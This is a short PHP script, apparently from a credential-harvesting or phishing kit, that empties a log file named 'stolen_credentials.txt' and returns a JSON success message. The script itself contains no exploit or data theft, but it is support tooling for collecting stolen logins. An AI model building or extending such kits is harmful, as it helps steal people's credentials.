<?php
/**
 * 清空凭据文件
 * 
 * @author  Guojin0826
 * @email   jinrcsy@gmail.com
 * @github  https://github.com/Guojin0826
 */

header('Content-Type: application/json');

$logFile = 'data/stolen_credentials.txt';
file_put_contents($logFile, '[]');

echo json_encode(['status' => 'success', 'message' => '数据已清空']);
?>